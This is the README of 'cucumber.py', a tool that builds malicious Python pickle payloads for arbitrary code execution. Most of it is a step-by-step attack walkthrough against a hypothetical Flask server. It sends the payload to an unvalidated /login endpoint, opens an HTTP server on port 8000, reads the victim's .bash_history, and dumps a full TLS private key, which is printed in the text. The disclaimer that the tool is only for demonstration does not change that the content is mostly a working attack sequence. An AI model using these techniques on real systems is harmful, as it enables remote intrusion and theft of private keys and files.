# cucumber.py
---

cucumber.py, ACE via Python pickle unpacking. Written by
Oelin <me.oelin@gmail.com>.

### Command

```
cucumber.py [path]
```
 
### Description

This script exploits features of Python's popular serialisation library, pickle, in such a way as to cause the execution of arbitrary code by programs at run-time. Simply specify the path to a file containing Python source code. An exploitative pickle serialisation will then be written to stdout (ouput). If another Python program attempts to unpack this
serialisation, the original code given will be executed. Note that this script should only be used for demonstratory purposes. It is not a security hacking tool!

### Usage

In the following example, a script to start a HTTP web server on port 8000 is crafted into a pickle serialisation. When subject to `pickle.loads()` (i.e by a vulnerable program), the script will be executed. The script can also be found in this repository at
`./scripts/httpd.py`.

```
$ ls
httpd.py
$ ./cucumber.py httpd.py > httpd.pickle
$ ls
httpd.py httpd.pickle
```
After an exploitative serialisation has been created, it can be used to audit target programs for vulnerabilities, namely those which do not perform adequate input validation. Shown below, is a hypothetical scenareo where an attacker manages to obtain the private TLS key of a Flask web server. The API endpoint `/login` does not provide validation of input data yet at some point invokes `pickle.loads()` on said data. By sending `httpd.pickle` as input, the endpoint will readily transfers control to the malicious script. The attacker may then connect over port 8000 to read arbitrary files on the target machine, including private ones.

```
$ curl https://api.alice.com/robots.txt
User-agent: *
Disallow: /users
Allow: /login
Disallow: /login?u=*
Allow: /search

$ curl https://api.alice.com/login?u=bob
{"state": "error", "reason": "base64 decode error"}

$ user=`echo bob | base64`
$ curl https://api.alice.com/login?u=$user
{"state": "error", "reason": "unpickling failed"}

$ user=`cat httpd.pickle`
$ curl https://api.alice.com/login?u=$user

...

^C
$ curl -I http://api.alice.com:8000/
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.6.7
Date: Thu, 28 Mar 2019 20:31:13 GMT
Content-type: text/html; charset=utf-8
Content-Length: 1907

$ curl http://api.alice.com:8000/.bash_history
.
.
.
ls
find . | grep 'key.pem'
cd /srv/http/alice.com/backup/tls
cat key.pem
vim
cd ~
.
.
.

$ curl http://api.alice.com:8000/srv/http/alice.com/backup/tls/key.pem
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQChTcy8+upAE3Nh
IGgpscmgMJaUR4PLyFxFbKNSXhSZwCEL27FtZEInRa9jcNYb4t4y272Z1xcHC311
x/JxBcOQ0EfMQmTmQP0jvfKQNA7TI4HOIKPsLS7GREtTZveqU1R7lNYR/fzhKmfn
ZELWE4PMbXelkalbuAzXbS1wo14M7T6U3kPXTbaatyIezTWCYnXJZhkK8vIszPnv
dn2Xo2i0H5NKOz5MKeUuZ3D++BawxlSQaGKiGrwvm+WCjD9BvncluMSbjwYmgXnM
l8+a1PDNPzY3s/TVoEKErNxox3jxu4HpWf70jF5soBK5yGde9s5RaYLSHQwf8969
crwx+6krAgMBAAECggEANn6vRcVLcJxhpZWqOzPaV2ky5iOHDkjBi57ZSpGISi1T
vMrbFYcCpnvvdhv/6enqgaolUx0MpY+nMix75t04pesH5qUjq3qXSwT4NumvfHuJ
dhcm6jqVi9w0ypeF4qBGcX3mGKwDTBrkgZMo1WRAacct3dzpJ5h1li5HZL98ncbb
onZwGKcGoAR4rfT0r+ijOs499OgGq3mRTceLK+PX0qnNU30B/IhwAvuSfKN4IiRH
d88tB+ZaasO+ZMTK8aEuM0GAgIl7OJLDswWaM2+AwawNrOyUaYHNSoQ0OPYc4/l7
CaoP6/ITnv5UrGGVKZbqVEo2YgGkHEDq7nPVc/flwQKBgQDU3cEv4q6Soue4ggwl
C5DlxHAu76ffQ55sU9L1IBUPS22Mf1td35CIVH5+Dj1Z9i3iSdACdFGs2NFxUGhC
CGICP41Uf5GG8YvcQh4KKJRTWeLLCr9RY4gK5vWeQE31JlzK18MfcrCXR058e+jA
MmQO6ZwG8OrxaZ6UsywvmNOXiwKBgQDB/UuwxgBOeGqGFdCzWtWMydNkbwEUjvho
3uL8wVWso8th+Bc1SPKd9wpEF+oZT/mhtvYc38JB9Q2eAri6uYEWfPrMXTmE9tje
U6TZhJf0Qg/NmATqCzkCmXSFIBaRFBSrlfD+fniFWw+GI4gntbNjjXFwxwHF0san
sK6uFblo4QKBgQCqlVbmb+rkGeZGJvliioVAjA42ntlRgtenCfmpdF9MFW8hw0HN
1YX2qnd/vxuNR0n36JzoCp0VPd+BxiT2nc8k7BbvGxfdIx6okNeP3nsW3JZxjhhJ
OdDgo7s7aV7P0UFVUFjOj9NSN9N+0LFxrDAg/zaJHXG5qqFpmrgTII6YBwKBgEs2
rFwzyPaj1Zl7Z9nChD38Gsw8Bc00ybfPg27AfzlaoIaxrD3qtLbui7pvE0MRMRa0
W6RCVY1BODBlmb48IoLXnl4SXzTgiKFbCPWVZV09J+ds46rjAw2w9e6PzHAfuwv0
LOZfntcFwXUe3bGXz5/vvWYeot9So9dst62jmqnBAoGBAJaCzGZ+/R3ndaAWLrzY
L2wlhdVMMdQ+CkLCgomaEVHvAgnxFXPCyLMslCw55DwJTqLZUnkZ+0ME1fywHxkU
vefy74c1qNFFi6JId3zkjFnTK0b+o1JsLLE9CFUOsJfOQuHDgCDMwSadcO6cdkxp
69cRB+4sChk3oWcFv7E8/euY
-----END PRIVATE KEY-----
$
$ Alice has been pwnd!
```
